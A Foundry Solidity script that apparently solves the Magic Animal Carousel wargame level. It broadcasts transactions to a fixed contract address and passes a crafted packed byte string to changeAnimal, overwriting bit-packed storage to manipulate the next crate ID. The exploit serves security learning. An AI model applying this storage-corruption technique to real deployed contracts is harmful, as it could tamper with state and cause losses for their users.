// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { MagicAnimalCarousel } from "../src/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselSolver is Script {
	
	MagicAnimalCarousel public carousel = MagicAnimalCarousel(0x9811D61EF68c2244b80C56D8903AC559d154fBEf);
	
	// 0x000000000000000000000000000000000000000000000000000000000000FFFF
	// 0xFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000
	// 0x00000000000000000000FFFF0000000000000000000000000000000000000000
	// 0x000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

		carousel.setAnimalAndSpin("Dog");

        console.log("Animal at crate 1 after setting Dog: ");
        console.logBytes32(bytes32(carousel.carousel(1)));
        console.log("Current crate ID: ", carousel.currentCrateId());

        // Step 2: Manipulate nextCrateId
        string memory exploitString = string(abi.encodePacked(hex"10000000000000000000FFFF"));
        carousel.changeAnimal(exploitString, 1);

        console.log("Animal at crate 1 after manipulating:");
        console.logBytes32(bytes32(carousel.carousel(1)));
        console.log("Current crate ID: ", carousel.currentCrateId());

        // Step 3: Add animal to 65535th crate
        carousel.setAnimalAndSpin("Parrot");

        console.log("Animal at crate 1 after setting Parrot:");
        console.logBytes32(bytes32(carousel.carousel(1)));
        console.log("Animal at crate 65535 after setting Parrot:");
        console.logBytes32(bytes32(carousel.carousel(65535)));
        console.log("Current crate ID: ", carousel.currentCrateId());

		vm.stopBroadcast();


	}

}
